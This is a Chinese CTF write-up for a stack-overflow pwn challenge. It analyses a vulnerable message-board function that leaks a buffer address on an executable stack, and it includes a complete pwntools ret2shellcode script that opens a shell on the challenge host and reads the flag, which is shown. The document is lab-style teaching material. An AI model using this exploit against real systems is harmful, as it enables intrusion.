# vuln WP

## 题目信息

- 目标地址：`47.99.147.34:26052`
- 附件：`./vuln/vuln`
- 复现脚本：`./vuln/solve.py`
- 最终拿到的远程 flag：`flag{38ad58a6ba4b17899788e836368d2ace}`

## 题目分析

先对附件做基本检查：

- `64-bit ELF`
- `No PIE`
- `No canary`
- `Partial RELRO`
- 栈可执行

这组保护组合已经很适合打栈溢出了。如果程序里既有栈溢出，又能拿到栈地址泄露，那基本就是标准的 `ret2shellcode`。

### 1. 程序核心逻辑

从反汇编可以很容易还原出关键函数：

```c
void vuln() {
    char buf[0x80];

    puts("=== Message Board ===");
    puts("Leave your message below:");
    printf("Buffer at: %p\n", buf);
    printf("Message: ");
    read(0, buf, 0x100);
    puts("Thank you for your message!");
}
```

漏洞点非常直接：

- 栈缓冲区 `buf` 只有 `0x80` 字节
- `read()` 却读取了 `0x100` 字节
- 明确存在栈溢出

更关键的是，程序还主动打印了：

```text
Buffer at: 0x7fffxxxxxxxx
```

这相当于把当前栈缓冲区地址直接送给了我们。

### 2. 为什么这题适合 ret2shellcode

这题最舒服的地方有两个：

1. 程序泄露了 `buf` 的真实栈地址
2. 栈是可执行的

于是就不需要再绕 libc，也不需要找复杂 ROP 链。最简单的办法就是：

1. 把 shellcode 直接写进 `buf`
2. 覆盖返回地址为 `buf` 的地址
3. 函数 `ret` 后直接落到栈上的 shellcode 执行

也就是典型的 `ret2shellcode`。

### 3. 偏移计算

`vuln()` 的栈布局很简单：

```text
rbp-0x80 ~ rbp-0x01 : buf[0x80]
rbp+0x00            : saved rbp
rbp+0x08            : return address
```

所以从 `buf` 开始覆盖到返回地址的偏移为：

```text
0x80 + 0x8 = 0x88
```

也就是：

```python
offset = 0x88
```

最终 payload 结构为：

```text
[ shellcode ][ padding 到 0x88 ][ buf 地址 ]
```

## 利用思路

利用链非常短：

1. 连接远程服务
2. 读取 `Buffer at: %p` 泄露出来的栈地址
3. 构造 `execve("/bin/sh", ...)` 的 shellcode
4. 用 shellcode 填充前 `0x80` 字节
5. 覆盖 saved rbp 和返回地址
6. 让返回地址跳回 `buf`
7. 拿到 shell 后执行 `cat flag`

这里不需要额外 `ret` 对齐，也不需要 `system("/bin/sh")` 后门，因为 shellcode 已经足够直接。

## 远程利用过程

连上远程后，服务会输出：

```text
=== Message Board ===
Leave your message below:
Buffer at: 0x7fff53415840
Message:
```

读到 `buf` 地址后，把 shellcode 打进栈里，并把返回地址改成该地址。函数返回后就会直接执行我们写入的 shellcode，得到一个 `sh`。

随后执行：

```sh
cat flag
```

即可读到 flag。

我在远程上顺手看了一下根目录内容，发现当前工作目录就是 `/`，并且存在名为 `flag` 的文件，所以直接 `cat flag` 即可，不需要特地读 `/flag`。

## 复现脚本

下面是我实际复现远程时使用的 `pwntools` 脚本：

```python
from pwn import *
import sys
import time

context.binary = ELF("./vuln", checksec=False)
context.arch = "amd64"

HOST = sys.argv[1] if len(sys.argv) > 1 else "47.99.147.34"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26052
OFFSET = 0x88


def exploit(io):
    io.recvuntil(b"Buffer at: ")
    buf_addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"Message: ")

    shellcode = asm(shellcraft.sh())
    payload = shellcode.ljust(OFFSET, b"\x90")
    payload += p64(buf_addr)

    io.send(payload)
    time.sleep(0.3)
    io.sendline(b"cat flag; exit")
    return io.recvall(timeout=2)


def main():
    io = remote(HOST, PORT)
    data = exploit(io)
    print(data.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
```

运行后可以直接读到：

```text
flag{38ad58a6ba4b17899788e836368d2ace}
```

## 总结

本题是非常标准的栈溢出基础题，但比普通 `ret2win` 更直接，因为程序自己就把两样关键条件都给出来了：

- 栈溢出：`read(0, buf, 0x100)` 写进 `0x80` 缓冲区
- 栈地址泄露：`printf("Buffer at: %p\n", buf)`

再加上栈可执行，所以最自然的利用方式就是 `ret2shellcode`。

最终 flag：

```text
flag{38ad58a6ba4b17899788e836368d2ace}
```
